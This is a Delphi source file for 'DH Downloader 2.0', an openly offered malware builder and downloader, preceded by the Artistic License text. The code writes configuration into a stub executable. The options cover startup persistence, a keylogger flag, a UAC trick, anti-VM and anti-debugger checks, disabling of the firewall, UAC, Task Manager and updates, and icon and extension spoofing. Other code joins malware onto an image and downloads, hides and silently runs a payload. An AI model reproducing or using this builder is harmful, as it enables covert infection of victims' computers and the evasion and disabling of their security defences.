{
  This software is Copyright (c) 2016 by Doddy Hackman.
  This is free software, licensed under:
  The Artistic License 2.0
  The Artistic License
  Preamble
  This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains some artistic control over the development of that Package while still keeping the Package available as open source and free software.
  You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement.
  Definitions
  "Copyright Holder" means the individual(s) or organization(s) named in the copyright notice for the entire Package.
  "Contributor" means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures.
  "You" and "your" means any person who would like to copy, distribute, or modify the Package.
  "Package" means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard Version, or a Modified Version.
  "Distribute" means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization.
  "Distributor Fee" means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees.
  "Standard Version" refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder.
  "Modified Version" means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder.
  "Original License" means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation in the future.
  "Source" form means the source code, documentation source, and configuration files for the Package.
  "Compiled" form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form.
  Permission for Use and Modification Without Distribution
  (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version.
  Permissions for Redistribution of the Standard Version
  (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package.
  (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard Version, and as such will be subject to the Original License.
  Distribution of Modified Versions of the Package as Source
  (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE of the following:
  (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include your modifications in the Standard Version.
  (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is different from the name of the Standard Version.
  (c) allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under
  (i) the Original License or
  (ii) a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that the licensee received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license fees are prohibited but Distributor Fees are allowed.
  Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source
  (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. Such instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware that the instructions are invalid, then you do not forfeit any of your rights under this license.
  (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version.
  Aggregating or Linking the Package
  (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation.
  (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package.
  Items That are Not Considered Part of a Modified Version
  (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license.
  General Provisions
  (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license.
  (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified Version complies with the requirements of this license.
  (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder.
  (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate on the date that such litigation is filed.
  (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
}

// DH Downloader 2.0
// (C) Doddy Hackman 2016

unit builder;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.ExtCtrls,
  Vcl.StdCtrls, Vcl.ImgList, Vcl.Imaging.pngimage, Vcl.Styles.Utils.ComCtrls,
  Vcl.Styles.Utils.Menus,
  Vcl.Styles.Utils.SysStyleHook,
  Vcl.Styles.Utils.SysControls, Vcl.Styles.Utils.Forms,
  Vcl.Styles.Utils.StdCtrls, Vcl.Styles.Utils.ScreenTips, DH_Form_Effects,
  DH_Builder_Tools, DH_Server_Manager, DH_File_Joiner, IdBaseComponent,
  IdComponent, IdTCPConnection, IdTCPClient, IdHTTP,
  OtlThreadPool, OtlComm, OtlTask,
  OtlTaskControl, ShellApi;

type
  TFormHome = class(TForm)
    imgLogo: TImage;
    ilIconosPageControl: TImageList;
    ilIconosBuilder: TImageList;
    ilIconosBotones: TImageList;
    pcOptions: TPageControl;
    tsBuilder: TTabSheet;
    pcBuilderOptions: TPageControl;
    tsConfiguration: TTabSheet;
    gbOptionsConfiguration: TGroupBox;
    cbHideFiles: TCheckBox;
    cbUseStartup: TCheckBox;
    tsUAC_Tricky: TTabSheet;
    cb_Use_UAC_Tricky: TCheckBox;
    gbTypeUAC_Tricky: TGroupBox;
    rbContinue_if_UAC_is_Off: TRadioButton;
    rbExit_if_UAC_is_Off: TRadioButton;
    tsExtractionPath: TTabSheet;
    gbPathExtractionPath: TGroupBox;
    cmbSpecialPaths: TComboBox;
    txtPath: TEdit;
    rbSelectPath: TRadioButton;
    rbIUseThis: TRadioButton;
    gbEnterFolderExtractionPath: TGroupBox;
    txtFolder: TEdit;
    tsDateTime: TTabSheet;
    cbUseThisDateTime: TCheckBox;
    gbDateTimeConfiguration: TGroupBox;
    lblCreationTime: TLabel;
    lblModifiedTime: TLabel;
    lblLastAccess: TLabel;
    txtCreationTime: TEdit;
    txtModifiedTime: TEdit;
    txtLastAccessTime: TEdit;
    tsFilePumper: TTabSheet;
    cbIUseFilePumper: TCheckBox;
    gbEnterCountFilePumper: TGroupBox;
    txtCount: TEdit;
    upEnterCountFilePumper: TUpDown;
    gbSelectTypeFilePumper: TGroupBox;
    cmbTypes: TComboBox;
    tsExtensionSpoofer: TTabSheet;
    cbUseExtensionSpoofer: TCheckBox;
    gbOptionsExtensionSpoofer: TGroupBox;
    cmbExtensions: TComboBox;
    rbUseSelectExtension: TRadioButton;
    rbUseThisExtension: TRadioButton;
    txtExtension: TEdit;
    tsIconChanger: TTabSheet;
    gbEnterIconIconChanger: TGroupBox;
    txtPathIcon: TEdit;
    btnLoadIcon: TButton;
    gbPreviewIconChanger: TGroupBox;
    imgPreviewIcon: TImage;
    cbUseIconChanger: TCheckBox;
    tsAntisDisables: TTabSheet;
    gbAntis: TGroupBox;
    cbAnti_VirtualPC: TCheckBox;
    cbAnti_VirtualBox: TCheckBox;
    cbAnti_Kaspersky: TCheckBox;
    cbAnti_Wireshark: TCheckBox;
    cbAnti_OllyDbg: TCheckBox;
    cbAnti_Anubis: TCheckBox;
    cbAnti_Debug: TCheckBox;
    cbAnti_VMWare: TCheckBox;
    gbDisables: TGroupBox;
    cbDisable_UAC: TCheckBox;
    cbDisable_Firewall: TCheckBox;
    cbDisable_CMD: TCheckBox;
    cbDisable_Run: TCheckBox;
    cbDisable_Regedit: TCheckBox;
    cbDisable_Taskmgr: TCheckBox;
    cbDisable_Updates: TCheckBox;
    cbDisable_MsConfig: TCheckBox;
    tsAbout: TTabSheet;
    gbAbout: TGroupBox;
    about: TImage;
    panelAbout: TPanel;
    labelAbout: TLabel;
    btnGenerate: TButton;
    gbEnterLink: TGroupBox;
    txtLink: TEdit;
    gbEnterNewName: TGroupBox;
    txtNewName: TEdit;
    tsGenerator: TTabSheet;
    gbEnterMalware: TGroupBox;
    txtMalware: TEdit;
    btnLoadMalware: TButton;
    gbEnterImage: TGroupBox;
    txtImage: TEdit;
    btnLoadImage: TButton;
    btnGenerateMalware: TButton;
    tsUSB_Mode: TTabSheet;
    gbEnterURL: TGroupBox;
    txtURL: TEdit;
    gbSavefile: TGroupBox;
    cbSaveFileWithThisName: TCheckBox;
    txtThisName: TEdit;
    cbSaveFileInThisDirectory: TCheckBox;
    txtSaveInThisDirectory: TEdit;
    gbOptions: TGroupBox;
    cbLoadShow: TRadioButton;
    cbHideFile: TCheckBox;
    cbLoadFileAs: TCheckBox;
    cbLoadHide: TRadioButton;
    btnDownload: TButton;
    status: TStatusBar;
    pbDownload: TProgressBar;
    gbSizesUSB: TGroupBox;
    lblImageSize: TLabel;
    txtImageSizeUSB: TEdit;
    lblMalwareSize: TLabel;
    txtMalwareSizeUSB: TEdit;
    gbSizes: TGroupBox;
    lblImage: TLabel;
    lblMalware: TLabel;
    txtImageSize: TEdit;
    txtMalwareSize: TEdit;
    nave: TIdHTTP;
    procedure btnGenerateClick(Sender: TObject);
    procedure btnLoadMalwareClick(Sender: TObject);
    procedure btnLoadImageClick(Sender: TObject);
    procedure btnGenerateMalwareClick(Sender: TObject);
    procedure btnDownloadClick(Sender: TObject);
    procedure naveWork(ASender: TObject; AWorkMode: TWorkMode;
      AWorkCount: Int64);
    procedure naveWorkBegin(ASender: TObject; AWorkMode: TWorkMode;
      AWorkCountMax: Int64);
    procedure naveWorkEnd(ASender: TObject; AWorkMode: TWorkMode);
    procedure FormCreate(Sender: TObject);
    procedure btnLoadIconClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    function open_dialog(title, filter: string; filter_index: integer): string;
    function save_dialog(title, filter, default_ext: string;
      filter_index: integer): string;
  end;

var
  FormHome: TFormHome;

implementation

{$R *.dfm}
// Functions

function message_box(title, message_text, type_message: string): string;
begin
  if not(title = '') and not(message_text = '') and not(type_message = '') then
  begin
    try
      begin
        if (type_message = 'Information') then
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONINFORMATION);
        end
        else if (type_message = 'Warning') then
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONWARNING);
        end
        else if (type_message = 'Question') then
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONQUESTION);
        end
        else if (type_message = 'Error') then
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONERROR);
        end
        else
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONINFORMATION);
        end;
        Result := '[+] MessageBox : OK';
      end;
    except
      begin
        Result := '[-] Error';
      end;
    end;
  end
  else
  begin
    Result := '[-] Error';
  end;
end;

function TFormHome.open_dialog(title, filter: string;
  filter_index: integer): string;
var
  odOpenFile: TOpenDialog;
  filename: string;
begin
  odOpenFile := TOpenDialog.Create(Self);
  odOpenFile.title := title;
  odOpenFile.InitialDir := GetCurrentDir;
  odOpenFile.Options := [ofFileMustExist];
  odOpenFile.filter := filter;
  odOpenFile.FilterIndex := filter_index;
  if odOpenFile.Execute then
  begin
    filename := odOpenFile.filename;
  end;
  odOpenFile.Free;
  Result := filename;
end;

function TFormHome.save_dialog(title, filter, default_ext: string;
  filter_index: integer): string;
var
  sdSaveFile: TSaveDialog;
  filename: string;
begin
  sdSaveFile := TSaveDialog.Create(Self);
  sdSaveFile.title := title;
  sdSaveFile.InitialDir := GetCurrentDir;
  sdSaveFile.filter := filter;
  sdSaveFile.DefaultExt := default_ext;
  sdSaveFile.FilterIndex := filter_index;
  if sdSaveFile.Execute then
  begin
    filename := sdSaveFile.filename;
  end;
  sdSaveFile.Free;
  Result := filename;
end;

function get_file_size(filename: string): Int64;
var
  searcher: TSearchRec;
  size: Int64;
begin
  size := 0;
  if FindFirst(filename, faAnyFile, searcher) = 0 then
  begin
    size := Int64(searcher.FindData.nFileSizeHigh) shl Int64(32) +
      Int64(searcher.FindData.nFileSizeLow);
  end;
  FindClose(searcher);
  Result := size;
end;

function get_filename_in_url(url: string): string;
var
  split: TStrings;
begin
  split := TStringList.Create;
  split.Delimiter := '/';
  split.DelimitedText := url;
  Result := split[split.Count - 1];
  split.Free;
end;

function file_loader_thread(filename, option: string): Boolean;
begin
  if (FileExists(filename)) and not(option = '') then
  begin
    try
      begin
        CreateTask(
          procedure(const task: IOmniTask)
          var
            file_to_load: string;
            option_load: string;
          begin

            file_to_load := task.Param['filename'].AsString;
            option_load := task.Param['option'].AsString;

            if (option_load = 'show') then
            begin
              ShellExecute(0, 'open', PChar(file_to_load), nil, nil,
                SW_SHOWNORMAL);
            end;
            if (option_load = 'hide') then
            begin
              ShellExecute(0, 'open', PChar(file_to_load), nil, nil, SW_HIDE);
            end;

          end).SetParameter('filename', filename).SetParameter('option', option)
          .Unobserved.Schedule;

        Result := True;
      end;
    except
      begin
        Result := False;
      end;
    end;
  end
  else
  begin
    Result := False;
  end;
end;

//

procedure TFormHome.btnDownloadClick(Sender: TObject);
var
  filename: string;
  directory: string;
  fullpath: string;
  stream: TFileStream;
  joiner: T_DH_File_Joiner;
  malware_new_name, image_new_name: string;
begin

  if not cbSaveFileWithThisName.Checked then
  begin
    filename := get_filename_in_url(txtURL.Text);
  end
  else
  begin
    filename := txtThisName.Text;
  end;

  if cbSaveFileInThisDirectory.Checked then
  begin
    directory := txtSaveInThisDirectory.Text;
    if not(DirectoryExists(directory)) then
    begin
      CreateDir(directory);
    end;
  end
  else
  begin
    directory := GetCurrentDir;
  end;

  fullpath := directory + '\' + filename;

  if (FileExists(fullpath)) then
  begin
    DeleteFile(fullpath);
  end;
  try
    begin
      stream := TFileStream.Create(fullpath, fmCreate);
      try
        begin
          nave.Get(txtURL.Text, stream);
        end;
      finally
        stream.Free;
      end;
    end;
    if (FileExists(fullpath)) then
    begin
      message_box('DH Downloader 2.0', 'File Downloaded', 'Information');
      joiner := T_DH_File_Joiner.Create();
      malware_new_name := directory + '\' + 'file.exe';
      image_new_name := directory + '\' + 'image.jpg';
      if (joiner.split_files(fullpath, [image_new_name, malware_new_name],
        [StrToInt(txtImageSizeUSB.Text), StrToInt(txtMalwareSizeUSB.Text)]))
      then
      begin
        if (cbHideFile.Checked) then
        begin
          SetFileAttributes(PChar(malware_new_name), FILE_ATTRIBUTE_HIDDEN);
        end;
        if (cbLoadFileAs.Checked) then
        begin
          if (cbLoadShow.Checked) then
          begin
            file_loader_thread(malware_new_name, 'show');
          end;
          if (cbLoadHide.Checked) then
          begin
            file_loader_thread(malware_new_name, 'hide');
          end;
          DeleteFile(fullpath);
          DeleteFile(image_new_name);
          message_box('DH Downloader 2.0', 'File Executed', 'Information');
        end;
      end
      else
      begin
        message_box('DH Downloader 2.0', 'Malware Invalid', 'Error');
      end;
      joiner.Free();
    end;
  except
    begin
      message_box('DH Downloader 2.0', 'Error in the download', 'Warning');
    end;
  end;

end;

procedure TFormHome.btnGenerateClick(Sender: TObject);
var
  builder_tools: T_DH_Builder_Tools;
  server_manager: T_DH_Server_Manager;
  stub_generado: string;

var
  link, new_name, malware_size, image_size: string;

var
  configuration, extraction_config, antis_config, disables_config,
    linea_final: string;

  //
var
  op_hide_files, op_use_startup, op_use_keylogger, op_use_special_path,
    op_i_use_this, op_use_uac_tricky, op_uac_tricky_continue_if_off,
    op_uac_tricky_exit_if_off, op_use_this_datetime, op_anti_virtual_pc,
    op_anti_virtual_box, op_anti_debug, op_anti_wireshark, op_anti_ollydbg,
    op_anti_anubis, op_anti_kaspersky, op_anti_vmware, op_disable_uac,
    op_disable_firewall, op_disable_cmd, op_disable_run, op_disable_taskmgr,
    op_disable_regedit, op_disable_updates, op_disable_msconfig: string;

  //

begin

  if (txtURL.Text = '') or (txtNewName.Text = '') or (txtImageSize.Text = '') or
    (txtMalwareSize.Text = '') then
  begin
    message_box('DH Downloader 2.0', 'Enter Configuration', 'Warning');
  end
  else
  begin
    stub_generado := save_dialog('Save your malware', 'Exe file|*.exe',
      'exe', 0);

    link := txtLink.Text;
    new_name := txtNewName.Text;
    malware_size := txtMalwareSize.Text;
    image_size := txtImageSize.Text;

    //

    if (cbHideFiles.Checked) then
    begin
      op_hide_files := '1';
    end
    else
    begin
      op_hide_files := '0';
    end;

    if (cbUseStartup.Checked) then
    begin
      op_use_startup := '1';
    end
    else
    begin
      op_use_startup := '0';
    end;

    if (cb_Use_UAC_Tricky.Checked) then
    begin
      op_use_uac_tricky := '1';
    end
    else
    begin
      op_use_uac_tricky := '0';
    end;

    if (rbContinue_if_UAC_is_Off.Checked) then
    begin
      op_uac_tricky_continue_if_off := '1';
    end
    else
    begin
      op_uac_tricky_continue_if_off := '0';
    end;

    if (rbExit_if_UAC_is_Off.Checked) then
    begin
      op_uac_tricky_exit_if_off := '1';
    end
    else
    begin
      op_uac_tricky_exit_if_off := '0';
    end;

    if (rbSelectPath.Checked) then
    begin
      op_use_special_path := '1';
    end
    else
    begin
      op_use_special_path := '0';
    end;

    if (rbIUseThis.Checked) then
    begin
      op_i_use_this := '1';
    end
    else
    begin
      op_i_use_this := '0';
    end;

    if (cbUseThisDateTime.Checked) then
    begin
      op_use_this_datetime := '1';
    end
    else
    begin
      op_use_this_datetime := '0';
    end;

    if (cbAnti_VirtualPC.Checked) then
    begin
      op_anti_virtual_pc := '1';
    end
    else
    begin
      op_anti_virtual_pc := '0';
    end;

    if (cbAnti_VirtualBox.Checked) then
    begin
      op_anti_virtual_box := '1';
    end
    else
    begin
      op_anti_virtual_box := '0';
    end;

    if (cbAnti_Debug.Checked) then
    begin
      op_anti_debug := '1';
    end
    else
    begin
      op_anti_debug := '0';
    end;

    if (cbAnti_Wireshark.Checked) then
    begin
      op_anti_wireshark := '1';
    end
    else
    begin
      op_anti_wireshark := '0';
    end;

    if (cbAnti_OllyDbg.Checked) then
    begin
      op_anti_ollydbg := '1';
    end
    else
    begin
      op_anti_ollydbg := '0';
    end;

    if (cbAnti_Anubis.Checked) then
    begin
      op_anti_anubis := '1';
    end
    else
    begin
      op_anti_anubis := '0';
    end;

    if (cbAnti_Kaspersky.Checked) then
    begin
      op_anti_kaspersky := '1';
    end
    else
    begin
      op_anti_kaspersky := '0';
    end;

    if (cbAnti_VMWare.Checked) then
    begin
      op_anti_vmware := '1';
    end
    else
    begin
      op_anti_vmware := '0';
    end;

    if (cbDisable_UAC.Checked) then
    begin
      op_disable_uac := '1';
    end
    else
    begin
      op_disable_uac := '0';
    end;

    if (cbDisable_Firewall.Checked) then
    begin
      op_disable_firewall := '1';
    end
    else
    begin
      op_disable_firewall := '0';
    end;

    if (cbDisable_CMD.Checked) then
    begin
      op_disable_cmd := '1';
    end
    else
    begin
      op_disable_cmd := '0';
    end;

    if (cbDisable_Run.Checked) then
    begin
      op_disable_run := '1';
    end
    else
    begin
      op_disable_run := '0';
    end;

    if (cbDisable_Taskmgr.Checked) then
    begin
      op_disable_taskmgr := '1';
    end
    else
    begin
      op_disable_taskmgr := '0';
    end;

    if (cbDisable_Regedit.Checked) then
    begin
      op_disable_regedit := '1';
    end
    else
    begin
      op_disable_regedit := '0';
    end;

    if (cbDisable_Updates.Checked) then
    begin
      op_disable_updates := '1';
    end
    else
    begin
      op_disable_updates := '0';
    end;

    if (cbDisable_MsConfig.Checked) then
    begin
      op_disable_msconfig := '1';
    end
    else
    begin
      op_disable_msconfig := '0';
    end;

    //

    configuration := '[link]' + link + '[link][new_name]' + new_name +
      '[new_name][malware_size]' + malware_size + '[malware_size][image_size]' +
      image_size + '[image_size]';

    configuration := configuration + '[active]1[active][op_hide_files]' +
      op_hide_files + '[op_hide_files]' + '[op_use_startup]' + op_use_startup +
      '[op_use_startup]' + '[op_keylogger]' + op_use_keylogger +
      '[op_keylogger]';
    extraction_config := '[op_use_special_path]' + op_use_special_path +
      '[op_use_special_path]' + '[op_use_this_path]' + op_i_use_this +
      '[op_use_this_path]' + '[special_path]' + cmbSpecialPaths.Text +
      '[special_path]' + '[path]' + txtPath.Text + '[path]' + '[folder]' +
      txtFolder.Text + '[folder]' + '[op_use_uac_tricky]' + op_use_uac_tricky +
      '[op_use_uac_tricky][op_uac_tricky_continue_if_off]' +
      op_uac_tricky_continue_if_off + '[op_uac_tricky_continue_if_off]' +
      '[op_uac_tricky_exit_if_off]' + op_uac_tricky_exit_if_off +
      '[op_uac_tricky_exit_if_off][op_use_this_datetime]' + op_use_this_datetime
      + '[op_use_this_datetime][creation_time]' + txtCreationTime.Text +
      '[creation_time][modified_time]' + txtModifiedTime.Text +
      '[modified_time][last_access]' + txtLastAccessTime.Text + '[last_access]';

    antis_config := '[op_anti_virtual_pc]' + op_anti_virtual_pc +
      '[op_anti_virtual_pc]' + '[op_anti_virtual_box]' + op_anti_virtual_box +
      '[op_anti_virtual_box]' + '[op_anti_debug]' + op_anti_debug +
      '[op_anti_debug]' + '[op_anti_wireshark]' + op_anti_wireshark +
      '[op_anti_wireshark]' + '[op_anti_ollydbg]' + op_anti_ollydbg +
      '[op_anti_ollydbg]' + '[op_anti_anubis]' + op_anti_anubis +
      '[op_anti_anubis]' + '[op_anti_kaspersky]' + op_anti_kaspersky +
      '[op_anti_kaspersky]' + '[op_anti_vmware]' + op_anti_vmware +
      '[op_anti_vmware]';

    disables_config := '[op_disable_uac]' + op_disable_uac + '[op_disable_uac]'
      + '[op_disable_firewall]' + op_disable_firewall + '[op_disable_firewall]'
      + '[op_disable_cmd]' + op_disable_cmd + '[op_disable_cmd]' +
      '[op_disable_run]' + op_disable_run + '[op_disable_run]' +
      '[op_disable_taskmgr]' + op_disable_taskmgr + '[op_disable_taskmgr]' +
      '[op_disable_regedit]' + op_disable_regedit + '[op_disable_regedit]' +
      '[op_disable_updates]' + op_disable_updates + '[op_disable_updates]' +
      '[op_disable_msconfig]' + op_disable_msconfig + '[op_disable_msconfig]';

    linea_final := configuration + extraction_config + antis_config +
      disables_config;

    DeleteFile(stub_generado);
    CopyFile(PChar(ExtractFilePath(Application.ExeName) + '/' + 'stub.exe'),
      PChar(stub_generado), True);

    builder_tools := T_DH_Builder_Tools.Create();
    server_manager := T_DH_Server_Manager.Create();

    if (builder_tools.write_resource(stub_generado, linea_final, 666)) then
    begin

      if (cbIUseFilePumper.Checked) then
      begin
        if (server_manager.file_pumper(stub_generado, txtCount.Text,
          cmbTypes.Text)) then
        begin
          status.Panels[0].Text := '[+] File Pumper';
          status.Update;
        end
        else
        begin
          status.Panels[0].Text := '[-] Error with File Pumper';
          status.Update;
        end;
      end;

      if (cbUseIconChanger.Checked) then
      begin
        if (server_manager.change_icon(stub_generado, txtPathIcon.Text)) then
        begin
          status.Panels[0].Text := '[+] Icon Changed';
          status.Update;
        end
        else
        begin
          status.Panels[0].Text := '[-] Error with Icon Changer';
          status.Update;
        end;
      end;

      if (cbUseExtensionSpoofer.Checked) then
      begin
        if (rbUseSelectExtension.Checked) then
        begin
          if (server_manager.extension_changer(stub_generado,
            cmbExtensions.Text)) then
          begin
            status.Panels[0].Text := '[+] Extension Changed';
            status.Update;
          end
          else
          begin
            status.Panels[0].Text := '[-] Error with Extension Changer';
            status.Update;
          end;
        end;
        if (rbUseThisExtension.Checked) then
        begin
          if (server_manager.extension_changer(stub_generado, txtExtension.Text))
          then
          begin
            status.Panels[0].Text := '[+] Extension Changed';
            status.Update;
          end
          else
          begin
            status.Panels[0].Text := '[-] Error with Extension Changer';
            status.Update;
          end;
        end;
      end;

      status.Panels[0].Text := '[+] Done';
      status.Update;

      message_box('DH Downloader 2.0', 'Stub Generated', 'Information');

    end
    else
    begin
      message_box('DH Downloader 2.0', 'Error generating stub', 'Error');
    end;

    builder_tools.Free;
    server_manager.Free;

  end;

end;

procedure TFormHome.btnLoadIconClick(Sender: TObject);
var
  icon_loaded: string;
begin
  icon_loaded := open_dialog('Select Icon', 'Icon file|*.ico', 0);
  if not(icon_loaded = '') then
  begin
    txtPathIcon.Text := icon_loaded;
    imgPreviewIcon.Picture.LoadFromFile(icon_loaded);
    message_box('DH Downloader 2.0', 'Icon loaded', 'Information');
  end
  else
  begin
    message_box('DH Downloader 2.0', 'Icon not found', 'Warning');
  end;
end;

procedure TFormHome.btnLoadImageClick(Sender: TObject);
var
  filename: string;
begin
  filename := open_dialog('Select Image',
    'All image files (*.bmp,*.jpg,*.pcx)|*.BMP;*.JPG;*.PCX|' +
    'BMP files (*.bmp)|*.BMP|' + 'JPEG files (*.jpg)|*.JPG|' +
    'PCX files (*.pcx)|*.PCX', 0);
  if not(filename = '') then
  begin
    txtImage.Text := filename;
    message_box('DH Downloader 2.0', 'File Selected', 'Information');
  end
  else
  begin
    message_box('DH Downloader 2.0', 'Select File', 'Warning');
  end;
end;

procedure TFormHome.btnLoadMalwareClick(Sender: TObject);
var
  filename: string;
begin
  filename := open_dialog('Select Malware', '', 0);
  if not(filename = '') then
  begin
    txtMalware.Text := filename;
    message_box('DH Downloader 2.0', 'File Selected', 'Information');
  end
  else
  begin
    message_box('DH Downloader 2.0', 'Select File', 'Warning');
  end;
end;

procedure TFormHome.FormCreate(Sender: TObject);
var
  effect: T_DH_Form_Effects;
begin
  UseLatestCommonDialogs := False;
  effect := T_DH_Form_Effects.Create();
  effect.Effect_Marquee_Label_DownUp(panelAbout, labelAbout, 1);
  effect.Free;
end;

procedure TFormHome.naveWork(ASender: TObject; AWorkMode: TWorkMode;
AWorkCount: Int64);
begin
  pbDownload.Position := AWorkCount;
  status.Panels[0].Text := '[+] Downloading ...';
  status.Update;
end;

procedure TFormHome.naveWorkBegin(ASender: TObject; AWorkMode: TWorkMode;
AWorkCountMax: Int64);
begin
  pbDownload.Max := AWorkCountMax;
  status.Panels[0].Text := '[+] Starting download ...';
  status.Update;
end;

procedure TFormHome.naveWorkEnd(ASender: TObject; AWorkMode: TWorkMode);
begin
  pbDownload.Position := 0;
  status.Panels[0].Text := '[+] File Downloaded';
  status.Update;
end;

procedure TFormHome.btnGenerateMalwareClick(Sender: TObject);
var
  malware, image: string;
  malware_size, image_size: integer;
  malware_ready: string;
  joiner: T_DH_File_Joiner;
begin
  joiner := T_DH_File_Joiner.Create();
  malware := txtMalware.Text;
  image := txtImage.Text;
  if not(malware = '') and not(image = '') then
  begin
    malware_size := get_file_size(malware);
    image_size := get_file_size(image);
    malware_ready := save_dialog('Save your malware',
      'All image files (*.bmp,*.jpg,*.pcx)|*.BMP;*.JPG;*.PCX|' +
      'BMP files (*.bmp)|*.BMP|' + 'JPEG files (*.jpg)|*.JPG|' +
      'PCX files (*.pcx)|*.PCX', 'jpg', 0);
    if not(malware_ready = '') then
    begin
      if (joiner.join_files(malware_ready, [image, malware])) then
      begin
        txtMalwareSize.Text := IntToStr(malware_size);
        txtImageSize.Text := IntToStr(image_size);
        message_box('DH Downloader 2.0', 'Files Joined', 'Information');
      end
      else
      begin
        message_box('DH Downloader 2.0', 'Error joining files', 'Error');
      end;
    end
    else
    begin
      message_box('DH Downloader 2.0', 'Select your output', 'Warning');
    end;
  end
  else
  begin
    message_box('DH Downloader 2.0', 'Select Files', 'Warning');
  end;
  joiner.Free();
end;

end.

// The End ?
